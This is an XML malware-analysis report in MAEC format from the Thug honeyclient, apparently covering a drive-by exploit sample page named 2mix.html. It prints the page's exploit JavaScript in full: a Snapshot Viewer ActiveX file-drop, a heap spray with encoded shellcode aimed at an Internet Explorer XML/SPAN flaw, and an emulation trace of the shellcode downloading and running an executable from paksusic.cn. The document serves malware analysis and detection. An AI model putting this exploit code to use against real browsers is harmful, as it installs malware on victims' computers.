<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
    <Analyses>
        <Analysis start_datetime="2012-12-11 20:57:18.171800" id="maec:thug:ana:2" analysis_method="Dynamic">
            <Subject>
                <Object object_name="http://127.0.0.1/thug/samples/./exploits/2mix.html" type="URI" id="maec:thug:obj:3">
                    <Associated_Code>
                        <Associated_Code_Snippet>
                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
                                <Code_Segment>
					
					        var p_url = "http://paksusic.cn/nuc/exe.php";
					
						function SS()
						{
							try{
								ret=new ActiveXObject("snpvw.Snapshot Viewer Control.1");
								var arbitrary_file = p_url;
								var dest = 'C:/Program Files/Outlook Express/wab.exe';
								document.write("&lt;object classid='clsid:F0E42D60-368C-11D0-AD81-00A0C90DC8D9' id='attack'&gt;&lt;/object&gt;");
								attack.SnapshotPath = arbitrary_file;
								setTimeout('window.location = "ldap://127.0.0.1"',2000);
								attack.CompressedPath = dest;
								attack.PrintSnapshot(arbitrary_file,dest);
							}catch(e){}
						}
					
						function WML()
						{
							document.write('&lt;div id="replace"&gt;x&lt;/div&gt;');
							var srtkod = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33" +
							"%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb" +
							"%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7" +
							"%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96" +
							"%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85" +
							"%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa" +
							"%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf" +
							"%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc" +
							"%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba" +
							"%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec" +
							"%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c" +
							"%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4" +
							"%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07" +
							"%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u702F%u6B61%u7573%u6973%u2E63%u6E63%u6E2F%u6375%u652F%u6578%u702E%u7068");
					
							var psrayt = unescape("%u0a0a%u0a0a");
							do {
					   			psrayt += psrayt;
							} while(psrayt.length &lt; 0xd0000);
							meray = new Array();
							for(i = 0; i &lt; 100; i++)
					   			meray[i] = psrayt + srtkod;
					
							xmlcode = '&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;image SRC=http://&amp;#x0a0a;&amp;#x0a0a;.example.com&gt;]]&gt;&lt;/C&gt;&lt;/X&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;XML ID=I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;/SPAN&gt;';
							tag = document.getElementById("replace");
							tag.innerHTML = xmlcode;
						}
					
						if (WML()||SS()) { }
				</Code_Segment>
                            </Code_Snippet>
                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
                        </Associated_Code_Snippet>
                        <Associated_Code_Snippet>
                            <Code_Snippet language="Assembly" id="maec:thug:cde:9">
                                <Discovery_Method tool_id="maec:thug:tol:8" method="Static Analysis"/>
                                <Code_Segment>
					HMODULE LoadLibraryA (
					     LPCTSTR = 0x02adb4c0 =&gt; 
					           = "URLMON";
					) =  0x7df20000;
					UINT GetSystemDirectory (
					     LPTSTR = 0x02adb6f0 =&gt; 
					           = "c:\WINDOWS\system32";
					     UINT uSize = 255;
					) =  0x13;
					ERROR  DeleteFile (
					     LPCTSTR = 0x02adb9a0 =&gt; 
					         none;
					) =  0xffffffff;
					HRESULT URLDownloadToFile (
					     LPUNKNOWN = 0x02ae1610 =&gt; 
					         none;
					     LPCTSTR = 0x02ae16d0 =&gt; 
					           = "http://paksusic.cn/nuc/exe.php";
					     LPCTSTR = 0x02ae1800 =&gt; 
					           = "c:\WINDOWS\system32\~.exe";
					     DWORD dwReserved = 0;
					     LPBINDSTATUSCALLBACK lpfnCB = 0;
					) =  0x800c0008;
					UINT WINAPI WinExec (
					     LPCSTR = 0x02adf520 =&gt; 
					           = "c:\WINDOWS\system32\~.exe";
					     UINT uCmdShow = 0;
					) =  0x20;
					void ExitThread (
					     DWORD dwExitCode = -1;
					) =  0x0;
				</Code_Segment>
                            </Code_Snippet>
                            <Nature_Of_Relationship>Shellcode</Nature_Of_Relationship>
                        </Associated_Code_Snippet>
                    </Associated_Code>
                    <Internet_Object_Attributes>
                        <URI>http://127.0.0.1/thug/samples/./exploits/2mix.html</URI>
                    </Internet_Object_Attributes>
                </Object>
            </Subject>
            <Tools_Used>
                <Tool id="maec:thug:tol:1">
                    <Name>Thug</Name>
                    <Version>0.4.9</Version>
                    <Organization>The Honeynet Project</Organization>
                </Tool>
            </Tools_Used>
        </Analysis>
    </Analyses>
    <Behaviors>
        <Behavior id="maec:thug:bhv:4">
            <Description>
                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/2mix.html (Status: 200, Referrer: None)</Text>
            </Description>
            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
        </Behavior>
    </Behaviors>
    <Pools/>
</MAEC_Bundle>
